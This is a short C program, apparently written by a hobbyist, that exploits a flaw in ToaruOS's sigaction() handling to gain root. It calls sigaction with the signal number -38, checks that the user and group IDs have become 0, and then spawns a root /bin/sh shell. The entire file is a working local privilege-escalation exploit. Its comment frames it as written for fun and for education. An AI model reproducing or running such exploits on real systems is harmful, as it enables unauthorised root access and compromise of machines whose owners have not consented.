/*
 * Author: Maxim Logaev
 *
 * This simple exploit uses a vulnerability
 * in ToaruOS's sigaction() function to elevate to root.
 * This is my first exploit I wrote for fun.
 * Use it for educational purposes only!
*/

#include <stdio.h>
#include <unistd.h>
#include <signal.h>

int main()
{
    printf("uid=%d gid=%d\n", getuid(), getgid());

    puts("Trying to exploit ");

    // The uid and gid of root are 0.
    struct sigaction act = {0};
    sigaction(-38, &act, NULL);

    uid_t uid = getuid();
    gid_t gid = getgid();

    printf("uid=%d gid=%d\n", uid, gid);

    if (uid || gid) {
        puts("Epic fail :(");
        return 1;
    }

    puts("Success! Launch shell:");

    char* args[] = {"/bin/sh", NULL};
    execv(args[0], args);

    return 0;
}
